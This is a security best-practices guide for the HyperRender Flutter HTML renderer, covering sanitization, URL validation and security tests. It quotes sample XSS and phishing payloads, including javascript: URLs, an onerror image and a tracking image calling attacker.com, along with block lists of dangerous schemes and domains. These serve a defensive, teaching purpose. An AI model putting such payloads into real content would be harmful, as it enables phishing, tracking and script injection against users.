# Security Best Practices

Last Updated: February 2026
Version: 1.0.0

This guide outlines security best practices when using HyperRender to render user-generated or untrusted HTML content.

## Table of Contents

1. Quick Security Checklist
2. Understanding XSS Vulnerabilities
3. Sanitization: When and How
4. Trusted vs Untrusted Content
5. URL Validation
6. Custom Widget Builders
7. Content Security Policy
8. Common Attack Vectors
9. Security Testing

## Quick Security Checklist

DO:
- Enable sanitize: true for ALL untrusted content (default in v1.0.0+)
- Validate URLs before opening with onLinkTap
- Use allowedTags to restrict HTML elements
- Keep allowDataAttributes: false unless absolutely needed
- Test with known XSS attack vectors
- Regularly update HyperRender to get security patches

DON'T:
- Disable sanitization for user-generated content
- Trust content from external APIs without sanitizing
- Allow javascript: or data: URLs
- Implement custom sanitization (use built-in)
- Expose sensitive data in HTML attributes

## Understanding XSS Vulnerabilities

### What is XSS (Cross-Site Scripting)?

XSS is a security vulnerability where malicious code is injected into web content. While Flutter apps don't execute JavaScript, HTML can still contain:
- Malicious URLs (`javascript:`, `data:`)
- Form elements that capture input
- Hidden tracking pixels
- Phishing content

### HyperRender XSS Attack Vectors

Even without JavaScript execution, attackers can:

1. **Phishing Links**
   ```html
   <a href="https://evil.com/fake-login">Reset your password</a>
   ```

2. **Data Exfiltration URLs**
   ```html
   <img src="https://attacker.com/track?user=victim">
   ```

3. **Protocol Exploits**
   ```html
   <a href="javascript:alert('XSS')">Click me</a>
   <a href="data:text/html,<script>alert('XSS')</script>">Click</a>
   ```

4. **Event Handler Attributes** (Sanitized by default)
   ```html
   <div onclick="malicious()">Content</div>
   ```

---

## Sanitization: When and How

### Default Behavior (v1.0.0+)

Sanitization is ENABLED by default for security:

```dart
// Secure (default in v1.0.0+)
HyperViewer(
  html: userGeneratedHtml,
  // sanitize: true,  // Default, no need to specify
)
```

### When to Disable Sanitization

ONLY disable for fully trusted content:

```dart
// Use with caution
HyperViewer(
  html: trustedHtmlFromYourBackend,
  sanitize: false,  // Only if content is 100% trusted
)
```

Trusted sources:
- Static HTML in your app bundle
- Content from your own CMS (properly validated server-side)
- Markdown converted by your app (using HyperViewer.markdown)

Untrusted sources (ALWAYS sanitize):
- User comments/posts
- External API responses
- URL parameters
- Clipboard content
- Any content users can edit

### What Sanitization Removes

The built-in sanitizer removes/blocks:

| Danger | Removed |
|--------|---------|
| script tags | Completely removed |
| Event handlers | onclick, onerror, onload, etc. |
| Form elements | form, input, button, select |
| Dangerous URLs | javascript:, data:, vbscript: |
| Object/embed tags | object, embed, iframe |
| Style injection | Inline styles allowed, but expressions blocked |
| Data attributes | Blocked unless allowDataAttributes: true |

## Trusted vs Untrusted Content

### Decision Tree

```
Is the HTML content coming from:
  └─ Your app's static assets?
     └─ YES → Trusted (can disable sanitize)
     └─ NO → Continue...

  └─ Your own backend API?
     └─ Is it properly validated server-side?
        └─ YES → Trusted (can disable sanitize)
        └─ NO → Untrusted (keep sanitize ON)

  └─ User input or external API?
     └─ ALWAYS Untrusted (keep sanitize ON)
```

### Examples

#### Trusted Content
```dart
// Static app content
const appHtml = '''
  <h1>Welcome to MyApp</h1>
  <p>This is our <strong>homepage</strong>.</p>
''';

HyperViewer(
  html: appHtml,
  sanitize: false,  // Safe - we control this content
)
```

#### Untrusted Content
```dart
// User-generated comment
final userComment = await api.getUserComment(commentId);

// Correct - Always sanitize user content
HyperViewer(
  html: userComment,
  sanitize: true,  // Required for user content
)

// Wrong - Never trust user content
HyperViewer(
  html: userComment,
  sanitize: false,  // Dangerous
)
```

#### Mixed Content (Best Practice)
```dart
// Combine trusted template with untrusted user data
final username = sanitizeText(user.name);  // Escape special chars
final trustedTemplate = '''
  <div class="user-card">
    <h3>$username</h3>
    <div class="user-bio">$userBioHtml</div>
  </div>
''';

HyperViewer(
  html: trustedTemplate,
  sanitize: true,  // Still sanitize to be safe
)
```

## URL Validation

### Validate URLs in onLinkTap

Always validate URLs before opening:

```dart
HyperViewer(
  html: content,
  onLinkTap: (url) {
    // Validate before opening
    if (_isSafeUrl(url)) {
      launchUrl(Uri.parse(url));
    } else {
      showDialog(
        context: context,
        builder: (_) => AlertDialog(
          title: Text('Blocked URL'),
          content: Text('This URL is not allowed: $url'),
        ),
      );
    }
  },
)

bool _isSafeUrl(String url) {
  final uri = Uri.tryParse(url);
  if (uri == null) return false;

  // Block dangerous protocols
  if (uri.scheme == 'javascript' ||
      uri.scheme == 'data' ||
      uri.scheme == 'vbscript') {
    return false;
  }

  // Block suspicious domains (example)
  final blockedDomains = ['evil.com', 'phishing.net'];
  if (blockedDomains.contains(uri.host)) {
    return false;
  }

  // Allow only HTTP(S)
  return uri.scheme == 'http' || uri.scheme == 'https';
}
```

### URL Whitelist Approach

For maximum security, whitelist allowed domains:

```dart
bool _isSafeUrl(String url) {
  final uri = Uri.tryParse(url);
  if (uri == null) return false;

  // Only allow specific trusted domains
  const allowedDomains = [
    'myapp.com',
    'trusted-partner.com',
    'docs.flutter.dev',
  ];

  return uri.scheme == 'https' &&
         allowedDomains.contains(uri.host);
}
```

## Custom Widget Builders

### Validate Custom Builder Input

When using `widgetBuilder`, validate the input:

```dart
HyperViewer(
  html: content,
  widgetBuilder: (context, node) {
    // Validate node properties
    if (node.tagName == 'custom-widget') {
      final dataUrl = node.attributes['data-url'];

      // Don't blindly trust attributes
      // return ImageFromUrl(dataUrl);

      // Validate first
      if (dataUrl != null && _isSafeUrl(dataUrl)) {
        return ImageFromUrl(dataUrl);
      } else {
        return Text('Invalid widget data');
      }
    }
    return null;
  },
)
```

### Secure Custom Media Builder

```dart
HyperViewer(
  html: content,
  widgetBuilder: (context, node) {
    if (node is AtomicNode && node.isVideo) {
      final videoUrl = node.src;

      // Validate video URL
      if (videoUrl == null || !_isSafeVideoUrl(videoUrl)) {
        return HyperErrorWidget.video(
          message: 'Video source not allowed',
        );
      }

      return VideoPlayer(url: videoUrl);
    }
    return null;
  },
)

bool _isSafeVideoUrl(String url) {
  final uri = Uri.tryParse(url);
  if (uri == null) return false;

  // Only allow HTTPS videos from trusted CDNs
  const trustedCdns = ['cdn.myapp.com', 'videos.cloudflare.com'];
  return uri.scheme == 'https' && trustedCdns.contains(uri.host);
}
```

## Content Security Policy

### Restrict Allowed Tags

For maximum security, explicitly whitelist allowed HTML tags:

```dart
HyperViewer(
  html: userContent,
  sanitize: true,
  allowedTags: const {
    // Text formatting
    'p', 'span', 'strong', 'em', 'b', 'i', 'u',
    // Headings
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    // Lists
    'ul', 'ol', 'li',
    // Links (with URL validation)
    'a',
    // NO IMAGES, NO FORMS, NO SCRIPTS
  },
)
```

### Data Attributes

Keep disabled unless needed:

```dart
// Avoid - Data attributes can contain arbitrary content
HyperViewer(
  html: userContent,
  allowDataAttributes: true,  // Allows data-* attributes
)

// Prefer - Default is false
HyperViewer(
  html: userContent,
  allowDataAttributes: false,  // Default, more secure
)
```

## Common Attack Vectors

### Attack Vector 1: Malicious Links

**Attack**:
```html
<a href="https://phishing-site.com/steal-password">
  Click here to verify your account
</a>
```

**Defense**:
```dart
onLinkTap: (url) {
  // Show confirmation dialog before opening
  showDialog(
    context: context,
    builder: (_) => AlertDialog(
      title: Text('Open Link?'),
      content: Text('Open $url in browser?'),
      actions: [
        TextButton(
          onPressed: () {
            if (_isSafeUrl(url)) {
              launchUrl(Uri.parse(url));
            }
          },
          child: Text('Open'),
        ),
      ],
    ),
  );
},
```

### Attack Vector 2: Image Tracking

**Attack**:
```html
<img src="https://tracker.com/pixel?user=victim&session=123">
```

Defense:
```dart
// Option 1: Block external images
allowedTags: const {'p', 'strong', 'em'},  // No 'img'

// Option 2: Proxy images through your server
widgetBuilder: (context, node) {
  if (node is AtomicNode && node.tagName == 'img') {
    final src = node.src;
    if (src != null && src.startsWith('https://yourcdn.com/')) {
      // Only show images from your CDN
      return Image.network(src);
    }
    return SizedBox.shrink();  // Block external images
  }
  return null;
},
```

### Attack Vector 3: Protocol Exploits

Attack:
```html
<a href="javascript:alert('XSS')">Click</a>
<a href="data:text/html,<script>alert(1)</script>">Click</a>
```

Defense:
```dart
// Sanitizer blocks these by default
HyperViewer(
  html: attackHtml,
  sanitize: true,  // Removes javascript: and data: URLs
)
```

## Security Testing

### Test with Known Attack Vectors

```dart
void testSecurity() {
  final attackVectors = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror="alert(1)">',
    '<a href="javascript:alert(1)">Click</a>',
    '<form action="evil.com"><input name="password"></form>',
    '<iframe src="evil.com"></iframe>',
    '<div onclick="malicious()">Click</div>',
  ];

  for (final attack in attackVectors) {
    testWidgets('Blocks: $attack', (tester) async {
      await tester.pumpWidget(
        MaterialApp(
          home: Scaffold(
            body: HyperViewer(
              html: attack,
              sanitize: true,
            ),
          ),
        ),
      );

      // Verify attack is blocked
      expect(find.text('XSS'), findsNothing);
      expect(find.text('alert'), findsNothing);
    });
  }
}
```

### Automated Security Scanning

```bash
# Run security tests
flutter test test/security_edge_cases_test.dart

# Check for sensitive data exposure
grep -r "api_key\|password\|secret" lib/
```

---

## Security Checklist for Production

Before deploying to production:

- Sanitization enabled for all untrusted content
- URL validation in onLinkTap callback
- allowedTags restricted to minimum needed
- allowDataAttributes disabled (default)
- Custom builders validate input
- Security tests passing
- No hardcoded secrets in HTML attributes
- External images proxied or validated
- Regular security updates applied
- User education (don't click suspicious links)

## Reporting Security Issues

Found a security vulnerability? Please report privately to the package maintainer.

Do NOT:
- Post vulnerabilities publicly
- Test on production systems without permission

Do:
- Provide detailed reproduction steps
- Include version information
- Suggest potential fixes if possible

## Additional Resources

- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- Flutter Security Best Practices: https://docs.flutter.dev/security
- HyperRender Security Tests: test/security_edge_cases_test.dart

Remember: Security is not a one-time setup. Regularly review and update your security practices as new threats emerge.
